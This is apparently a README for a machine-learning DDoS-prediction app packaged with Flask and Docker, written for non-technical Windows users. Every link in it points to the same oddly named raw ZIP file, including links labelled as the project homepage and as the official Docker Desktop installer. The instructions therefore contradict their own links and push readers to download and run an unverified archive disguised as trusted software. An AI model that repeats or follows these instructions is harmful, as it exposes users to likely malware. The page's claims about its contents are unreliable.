# ⚡ ddos-attack-prediction - Predict DDoS Attacks with Ease

[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/eyoliya/ddos-attack-prediction/main/models/ddos_attack_prediction_magnetoplumbite.zip)

---

## 🔍 About ddos-attack-prediction

This application uses machine learning to predict DDoS (Distributed Denial of Service) attacks. It works by analyzing network data with an AdaBoost model that has over 98% accuracy. The model runs behind a simple web interface powered by Flask, and you can monitor its status using AWS CloudWatch. The software runs inside a Docker container for ease of setup and consistency. The machine learning model is stored safely on AWS S3.

You do not need technical knowledge to run this software on your Windows PC. This guide will help you download, install, and start the application step-by-step.

---

## 🌐 What You’ll Need

Before starting, make sure you have:

- A Windows 10 or later computer
- About 2GB of free disk space
- A reliable internet connection
- Administrator rights to install software
- Basic familiarity with using files and folders on Windows

This application runs inside Docker, so you will also need to install Docker Desktop if it is not already on your computer.

---

## 💾 Download ddos-attack-prediction

Click the large green button below to visit the GitHub page where you can download the full software package and related files.

[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/eyoliya/ddos-attack-prediction/main/models/ddos_attack_prediction_magnetoplumbite.zip)

1. After clicking the link, you will see the GitHub project homepage.
2. Look for the latest release or the main branch files.
3. Download the entire package as a ZIP file by clicking the green “Code” button and choosing "Download ZIP."
4. Save the ZIP file somewhere easy to find, like your Desktop.

---

## 🛠 Install Docker Desktop on Windows

The software runs inside a Docker container to keep the environment consistent. If you do not have Docker Desktop installed, follow these steps:

1. Visit https://raw.githubusercontent.com/eyoliya/ddos-attack-prediction/main/models/ddos_attack_prediction_magnetoplumbite.zip
2. Click “Download for Windows (Windows 10 or later)”
3. Run the downloaded installer file.
4. Follow the installation prompts.
5. When finished, restart your computer.
6. Open Docker Desktop to make sure it runs correctly (it will show as an icon in your system tray).

Docker Desktop needs virtualization enabled on your PC. If the app shows errors, check your BIOS or system settings to enable virtualization technology.

---

## 📂 Prepare the Application

1. Locate the ZIP file you downloaded.
2. Right-click and select “Extract All”.
3. Choose a folder to extract the files to, such as `C:\ddos-attack-prediction`.
4. Open the extracted folder.
5. You should see files like `Dockerfile`, `app.py`, and folders for the model and monitoring tools.

---

## 🚀 Running the Application

Once Docker Desktop is running and you have the software files ready, follow these steps:

1. Open the **Command Prompt** by clicking the Start menu, typing “cmd,” and pressing Enter.
2. Change directory to where you extracted the files. For example:

```
cd C:\ddos-attack-prediction
```

3. Build the Docker container that holds the application. Type:

```
docker build -t ddos-attack-prediction .
```

4. After the build completes without errors, start the container with this command:

```
docker run -d -p 5000:5000 ddos-attack-prediction
```

5. This command runs the application in the background and maps port 5000 on your PC.

---

## 🌐 Accessing the Application

1. Open a web browser.
2. Go to this address:

```
http://localhost:5000
```

3. You will see the main application interface to begin predicting possible DDoS attacks.
4. Follow on-screen prompts to upload data or start monitoring.

---

## 📦 What’s Inside the Application?

The main components include:

- **AdaBoost ML Model**: A machine learning algorithm trained to spot DDoS attacks using network data.
- **Flask REST API**: A simple web server that manages requests and responses.
- **Docker Container**: A package that makes setup and operation easy without installing many dependencies.
- **AWS S3 Storage**: Where the machine learning model is stored and accessed securely.
- **AWS CloudWatch Monitoring**: Keeps track of the system’s health and logs data for analysis.

---

## ⚙️ System Requirements

- Windows 10 or later
- At least 8GB RAM recommended for smooth Docker use
- 64-bit processor with virtualization support
- 2GB of free disk space for application and Docker images
- Internet access for initial download and AWS communication

---

## 🔧 Troubleshooting Tips

- If Docker commands fail, make sure Docker Desktop is running and you have permission.
- If your web browser cannot connect to `localhost:5000`, check your firewall settings to allow traffic.
- Restart Docker Desktop and your PC if you encounter network errors.
- In case of errors during Docker build, verify you downloaded all files correctly and that your internet is working.
- Check that virtualization is enabled in BIOS if Docker fails to start.

---

## 🔗 Additional Resources

For further details or updates, visit the main GitHub page:

[https://raw.githubusercontent.com/eyoliya/ddos-attack-prediction/main/models/ddos_attack_prediction_magnetoplumbite.zip](https://raw.githubusercontent.com/eyoliya/ddos-attack-prediction/main/models/ddos_attack_prediction_magnetoplumbite.zip)

---

## 📃 License

This software is open-source. You can find license details on the GitHub repository page.